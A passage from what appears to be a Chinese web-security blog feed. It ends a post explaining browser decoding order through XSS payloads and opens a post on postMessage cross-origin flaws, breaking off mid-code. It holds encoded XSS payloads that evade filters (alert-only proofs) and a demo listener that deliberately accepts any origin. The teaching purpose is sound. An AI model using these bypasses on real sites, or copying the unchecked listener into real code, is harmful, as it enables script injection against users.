href="https://developer.mozilla.org/zh-CN/docs/Glossary/Identifier" target="_blank" rel="noopener">https://developer.mozilla.org/zh-CN/docs/Glossary/Identifier</a></p></blockquote><h3 id="payload7"><a href="#payload7" class="headerlink" title="payload7"></a>payload7</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#48;&amp;#41;&amp;#59;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>该payload无法执行，因为JavaScript解析器工作时，HTML解析器的工作已经结束了。</p><p><code>script</code>属于原始文本元素(Raw text elements)，<strong>只可以容纳文本</strong>，注意<strong>没有字符引用</strong>，于是直接由JS处理，JS也认不出来，执行失败。</p><p>注意：原始文本元素(Raw text elements)有<code>&lt;script&gt;</code>和<code>&lt;style&gt;</code>。</p><h3 id="payload8"><a href="#payload8" class="headerlink" title="payload8"></a>payload8</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">\u0061\u006c\u0065\u0072\u0074(\u0030)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>该payload看似能执行，但实际并不会，这是因为<code>\u0030</code>在JavaScript解码时会被解码为字符串”0”而不是数字0。</p><p>注意：JavaScript解码的结果都是字符串，而字符串自然是需要引号的，所以JavaScript执行失败。</p><h3 id="payload9"><a href="#payload9" class="headerlink" title="payload9"></a>payload9</h3><p>先对<code>alert(0)</code>进行JavaScript编码：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript:\u0061\u006c\u0065\u0072\u0074('\u0030')"</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>然后对编码后的结果进行URL编码：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript:%5c%75%30%30%36%31%5c%75%30%30%36%63%5c%75%30%30%36%35%5c%75%30%30%37%32%5c%75%30%30%37%34%28%27%5c%75%30%30%33%30%27%29"</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>最后，对所有内容进行HTML编码，得到最终payload，是能成功执行的：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#37;&amp;#53;&amp;#99;&amp;#37;&amp;#55;&amp;#53;&amp;#37;&amp;#51;&amp;#48;&amp;#37;&amp;#51;&amp;#48;&amp;#37;&amp;#51;&amp;#54;&amp;#37;&amp;#51;&amp;#49;&amp;#37;&amp;#53;&amp;#99;&amp;#37;&amp;#55;&amp;#53;&amp;#37;&amp;#51;&amp;#48;&amp;#37;&amp;#51;&amp;#48;&amp;#37;&amp;#51;&amp;#54;&amp;#37;&amp;#54;&amp;#51;&amp;#37;&amp;#53;&amp;#99;&amp;#37;&amp;#55;&amp;#53;&amp;#37;&amp;#51;&amp;#48;&amp;#37;&amp;#51;&amp;#48;&amp;#37;&amp;#51;&amp;#54;&amp;#37;&amp;#51;&amp;#53;&amp;#37;&amp;#53;&amp;#99;&amp;#37;&amp;#55;&amp;#53;&amp;#37;&amp;#51;&amp;#48;&amp;#37;&amp;#51;&amp;#48;&amp;#37;&amp;#51;&amp;#55;&amp;#37;&amp;#51;&amp;#50;&amp;#37;&amp;#53;&amp;#99;&amp;#37;&amp;#55;&amp;#53;&amp;#37;&amp;#51;&amp;#48;&amp;#37;&amp;#51;&amp;#48;&amp;#37;&amp;#51;&amp;#55;&amp;#37;&amp;#51;&amp;#52;&amp;#37;&amp;#50;&amp;#56;&amp;#37;&amp;#50;&amp;#55;&amp;#37;&amp;#53;&amp;#99;&amp;#37;&amp;#55;&amp;#53;&amp;#37;&amp;#51;&amp;#48;&amp;#37;&amp;#51;&amp;#48;&amp;#37;&amp;#51;&amp;#51;&amp;#37;&amp;#51;&amp;#48;&amp;#37;&amp;#50;&amp;#55;&amp;#37;&amp;#50;&amp;#57;"</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><ol><li><code>&lt;script&gt;</code>和<code>&lt;style&gt;</code>数据只能有文本，不会有HTML解码和URL解码操作；</li><li><code>&lt;textarea&gt;</code>和<code>&lt;title&gt;</code>里会有HTML解码操作，但不会有子元素；</li><li>其他元素数据（如<code>div</code>）和元素属性数据（如<code>href</code>）中会有HTML解码操作；</li><li>部分属性（如<code>href</code>）会有URL解码操作，但URL中的协议需为ASCII；</li><li>JavaScript会对字符串和标识符Unicode解码；</li></ol><h2 id="0x05-script标签"><a href="#0x05-script标签" class="headerlink" title="0x05 script标签"></a>0x05 script标签</h2><p>script标签用来指定网页中所执行的JavaScript，其中既可以直接包含JS代码，也可以指向一个JS外链。</p><h3 id="执行顺序"><a href="#执行顺序" class="headerlink" title="执行顺序"></a>执行顺序</h3><p>script标签按照它所出现的顺序依次执行。</p><p>比如这样就能弹框显示6：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="actionscript"><span class="keyword">var</span> x = <span class="number">6</span>;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">alert(x);</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>但反过来就执行就找不到x变量了，报错<code>Uncaught ReferenceError: x is not defined</code>：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">alert(x);</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="actionscript"><span class="keyword">var</span> x = <span class="number">6</span>;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>同理，使用script引入外链是一样的：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"http://a.com/a.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"http://mi1k7ea.com/m.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>页面元素在渲染之前，首先会等待所有脚本都加载完毕，所以如果存在某些较慢的脚本，网页加载速度将会被严重拖累。但这个规则不适用于网页加载完成之后，通过document.appendChild之类的方法，在DOM树下添加script标签，这些标签会根据浏览器请求完成的先后来执行脚本，不再保证加载顺序。</p><h3 id="执行域"><a href="#执行域" class="headerlink" title="执行域"></a>执行域</h3><p>script标签只能访问它之前的HTML元素。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="actionscript"><span class="comment">// document.head is available</span></span></span><br><span class="line"><span class="actionscript"><span class="comment">// document.body is not!</span></span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="actionscript"><span class="comment">// document.head is available</span></span></span><br><span class="line"><span class="actionscript"><span class="comment">// document.body is available</span></span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="innerHTML"><a href="#innerHTML" class="headerlink" title="innerHTML"></a>innerHTML</h3><p>通过DOM动态添加到页面上的script标签会被浏览器执行：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> myScript = <span class="built_in">document</span>.createElement(<span class="string">"script"</span>);</span><br><span class="line">myScript.textContent = <span class="string">"alert(0)"</span>;</span><br><span class="line"><span class="built_in">document</span>.head.appendChild(myScript);</span><br></pre></td></tr></table></figure><p>但是使用innerHTML动态添加到页面上的script标签并不会被浏览器执行：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">document.head.innerHTML += "<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">alert(0)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>";</span><br></pre></td></tr></table></figure><h2 id="0x06-SVG黑魔法"><a href="#0x06-SVG黑魔法" class="headerlink" title="0x06 SVG黑魔法"></a>0x06 SVG黑魔法</h2><p>看如下两个payload。</p><p>payload1，HTML编码<code>(</code>，是无法正常执行的，因为script标签内会进行JS解码、此时HTML解析器已完成工作了：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">alert&amp;#40;1)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>payload2，在前面加个svg标签，此时能成功触发弹框：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">alert&amp;#40;1)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>可执行的原因在于，svg属于外部元素，svg标签遵循XML和SVG的定义。</p><p>我们知道，在XML中，<code>&amp;#40;</code>会被解析成<code>（</code>。在XML中实体会自动转义，除了<code>&lt;![CDATA[</code>和<code>]]&gt;</code>包含的实体代码：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">xml</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>aaa<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>aaaaaaa&amp;#40;<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">xml</span>&gt;</span></span><br></pre></td></tr></table></figure><p>当然，<a href="https://www.w3.org/TR/SVG/script.html#ScriptElement" target="_blank" rel="noopener">SVG标准中</a>也定义了script标签的存在：</p><p><img src="/2020/04/06/从浏览器解析原理看XSS/1.png" alt=""></p><p>所以，这个XSS之所以能够执行是因为遵循了svg及xml的标准。</p><h2 id="0x07-参考"><a href="#0x07-参考" class="headerlink" title="0x07 参考"></a>0x07 参考</h2><p><a href="https://xz.aliyun.com/t/5863" target="_blank" rel="noopener">浏览器解码看XSS</a></p><p><a href="http://whip1ash.cn/2018/07/01/HTML-Javscript-self-decode/" target="_blank" rel="noopener">XSS基础——浏览器自解码机制</a></p><p><a href="https://xz.aliyun.com/t/5950" target="_blank" rel="noopener">从 XSS Payload 学习浏览器解码</a></p><p><a href="https://www.hackersb.cn/hacker/85.html" target="_blank" rel="noopener">SVG XSS的一个黑魔法</a></p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Web安全基础" scheme="https://www.mi1k7ea.com/categories/Web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="XSS" scheme="https://www.mi1k7ea.com/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>postMessage跨域漏洞总结</title>
    <link href="https://www.mi1k7ea.com/2020/04/06/%E6%B5%85%E6%9E%90postMessage%E5%AE%89%E5%85%A8/"/>
    <id>https://www.mi1k7ea.com/2020/04/06/浅析postMessage安全/</id>
    <published>2020-04-06T04:46:28.000Z</published>
    <updated>2020-04-06T14:14:08.737Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-基本概念"><a href="#0x01-基本概念" class="headerlink" title="0x01 基本概念"></a>0x01 基本概念</h2><h3 id="何为postMessage"><a href="#何为postMessage" class="headerlink" title="何为postMessage"></a>何为postMessage</h3><p>一般的，由于同源策略（SOP）的限制，不同域之间是无法进行通信的。</p><p>我们知道常见的跨域技术有JSONP、CORS等。除此之外，在HTML5中新增了postMessage方法来实现跨域通信，postMessage可以实现跨文档消息传输（Cross Document Messaging），Internet Explorer 8, Firefox 3, Opera 9, Chrome 3和 Safari 4都支持postMessage。</p><p>postMessage可以通过绑定window的message事件来监听发送跨文档消息传输内容。</p><p>API参考：<a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Window/postMessage" target="_blank" rel="noopener">https://developer.mozilla.org/zh-CN/docs/Web/API/Window/postMessage</a></p><h3 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法"></a>基本用法</h3><h4 id="函数基本语法"><a href="#函数基本语法" class="headerlink" title="函数基本语法"></a>函数基本语法</h4><p>postMessage()函数基本语法如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">otherWindow.postMessage(message, targetOrigin, [transfer]);</span><br></pre></td></tr></table></figure><ul><li>otherWindow：其他窗口的一个引用，比如iframe的contentWindow属性、执行window.open返回的窗口对象、或者是命名过或数值索引的window.frames。</li><li>message：将要发送到其他 window的数据。它将会被结构化克隆算法序列化。这意味着你可以不受什么限制的将数据对象安全的传送给目标窗口而无需自己序列化。</li><li>targetOrigin：通过窗口的origin属性来指定哪些窗口能接收到消息事件，其值可以是字符串<code>*</code>（表示无限制）或者一个URI。在发送消息的时候，如果目标窗口的协议、主机地址或端口这三者的任意一项不匹配targetOrigin提供的值，那么消息就不会被发送；只有三者完全匹配，消息才会被发送。这个机制用来控制消息可以发送到哪些窗口；例如，当用postMessage传送密码时，这个参数就显得尤为重要，必须保证它的值与这条包含密码的信息的预期接受者的origin属性完全一致，来防止密码被恶意的第三方截获。如果你明确的知道消息应该发送到哪个窗口，那么请始终提供一个有确切值的targetOrigin，而不是<code>*</code>。不提供确切的目标将导致数据泄露到任何对数据感兴趣的恶意站点。</li><li>transfer（可选）：是一串和message 同时传递的 Transferable 对象. 这些对象的所有权将被转移给消息的接收方，而发送一方将不再保有所有权。</li></ul><h4 id="子窗口引用获取"><a href="#子窗口引用获取" class="headerlink" title="子窗口引用获取"></a>子窗口引用获取</h4><p>postMessage在通信之前，父窗口需要先获得子窗口的引用，存在两个情况：</p><ul><li>获取iframe的引用；</li><li>获取window.open的引用；</li></ul><p>后面的示例以iframe引用为例。</p><h4 id="父窗口-gt-子窗口"><a href="#父窗口-gt-子窗口" class="headerlink" title="父窗口 -&gt; 子窗口"></a>父窗口 -&gt; 子窗口</h4><p>父窗口 father.com 向子窗口 son.com 发消息，调用postMessage方法即可：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> receiver = <span class="built_in">window</span>.open(<span class="string">'http://son.com'</span>, <span class="string">'title'</span>);</span><br><span class="line">receiver.postMessage(<span class="string">'HelloWorld!'</span>, <span class="string">'http://son.com'</span>);</span><br></pre></td></tr></table></figure><p>postMessage()函数的第一个参数是消息内容，第二个参数是接收消息的窗口的源，也可以设置为<code>*</code>，表示不限定域名，向所有窗口发送消息。</p><h4 id="子窗口-gt-父窗口"><a href="#子窗口-gt-父窗口" class="headerlink" title="子窗口 -&gt; 父窗口"></a>子窗口 -&gt; 父窗口</h4><p>子窗口发送消息的方法类似：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">window</span>.opener.post(<span class="string">'Nice to meet you'</span>, <span class="string">'http://father.com'</span>);</span><br></pre></td></tr></table></figure><h4 id="监听消息"><a href="#监听消息" class="headerlink" title="监听消息"></a>监听消息</h4><p>父窗口和子窗口都可以通过message事件来监听对方的消息：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">window</span>.addEventListener(<span class="string">'message'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">event</span>)</span>&#123;</span><br><span class="line">    <span class="comment">//event.data就是接收到的数据</span></span><br><span class="line">    <span class="built_in">console</span>.log(event.data);</span><br><span class="line">&#125;,<span class="literal">false</span>);</span><br></pre></td></tr></table></figure><p>message事件的事件对象，提供三个对象：</p><h5 id="event-source"><a href="#event-source" class="headerlink" title="event.source"></a>event.source</h5><p>event.source表示发送对象的窗口。</p><p>子窗口可以通过event.source属性引用父窗口，然后发送消息：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">window</span>.addEventListener(<span class="string">'message'</span>, receiveMessage);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">receiveMessage</span>(<span class="params">event</span>) </span>&#123;</span><br><span class="line">    event.source.postMessage(<span class="string">'Nice to see you!'</span>, <span class="string">'*'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="event-origin"><a href="#event-origin" class="headerlink" title="event.origin"></a>event.origin</h5><p>event.origin表示消息发往的地址。</p><p>可以使用event.origin来过滤不是发送给本窗口的消息：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">window</span>.addEventListener(<span class="string">'message'</span>, receiveMessage);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">receiveMessage</span>(<span class="params">event</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (event.origin !== <span class="string">'http://father.com'</span>) <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">if</span> (event.data == <span class="string">'HelloWorld!'</span>) &#123;</span><br><span class="line">        event.source.postMessage(<span class="string">'Hello'</span>, event.origin);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(event.data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="event-data"><a href="#event-data" class="headerlink" title="event.data"></a>event.data</h5><p>event.data表示消息内容。</p><h3 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h3><p>father.html，父iframe，运行在127.0.0.1这个域iframe引入位于192.168.203.1的子窗口：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>Father<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>Father's Page<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">id</span>=<span class="string">"text"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">"send"</span>&gt;</span>Send Message<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"http://192.168.203.1/child.html"</span> <span class="attr">id</span>=<span class="string">"receiver"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="built_in">window</span>.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> receiver = <span class="built_in">document</span>.getElementById(<span class="string">'receiver'</span>).contentWindow;</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> btn = <span class="built_in">document</span>.getElementById(<span class="string">'send'</span>);</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="actionscript">btn.addEventListener(<span class="string">'click'</span>, <span class="function"><span class="keyword">function</span><span class="params">(e)</span></span>&#123;</span></span><br><span class="line"><span class="undefined">e.preventDefault();</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> val = <span class="built_in">document</span>.getElementById(<span class="string">'text'</span>).value;</span></span><br><span class="line"><span class="actionscript">receiver.postMessage(val, <span class="string">"http://192.168.203.1"</span>);</span></span><br><span class="line"><span class="undefined">&#125;);</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>child.html，子iframe，运行在192.168.203.1这个域，监听回复位于127.0.0.1的父窗口：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>Child<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"message"</span>&gt;</span></span><br><span class="line">Hello World!</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="built_in">window</span>.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> messageEle = <span class="built_in">document</span>.getElementById(<span class="string">'message'</span>);</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="built_in">window</span>.addEventListener(<span class="string">'message'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123;</span></span><br><span class="line"><span class="actionscript"><span class="keyword">if</span> (e.origin !== <span class="string">"http://127.0.0.1"</span>) &#123;</span></span><br><span class="line"><span class="actionscript"><span class="keyword">return</span>;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="actionscript">messageEle.innerHTML = <span class="string">"Received Message: "</span> + e.data;</span></span><br><span class="line"><span class="undefined">&#125;);</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>最终效果如下：</p><p><img src="/2020/04/06/浅析postMessage安全/1.png" alt=""></p><h2 id="0x02-postMessage跨域漏洞"><a href="#0x02-postMessage跨域漏洞" class="headerlink" title="0x02 postMessage跨域漏洞"></a>0x02 postMessage跨域漏洞</h2><p>postMessage跨域漏洞主要包括两大类：</p><ul><li>伪造数据发送端，造成XSS等问题；</li><li>伪造数据接收端，窃取用户数据，类似于JSONP劫持漏洞；</li></ul><h3 id="伪造数据发送端"><a href="#伪造数据发送端" class="headerlink" title="伪造数据发送端"></a>伪造数据发送端</h3><p>当接收端接收任意窗口的消息，未对父窗口来源进行限制并将消息输出时，此时攻击者可以伪造数据发送端来进行各种危险操作。比如订单支付时，父窗口传输订单详情，子窗口处理支付流程，攻击者可以伪造父窗口来篡改订单详情，让用户支付了本不属于自己的订单。</p><p>接下来以伪造父窗口，导致XSS为例。</p><h4 id="iframe引用"><a href="#iframe引用" class="headerlink" title="iframe引用"></a>iframe引用</h4><p>child.html，接受任意窗口的消息，并对消息进行输出：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Type"</span> <span class="attr">content</span>=<span class="string">"text/html; charset=UTF-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>Web page from child.com<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span 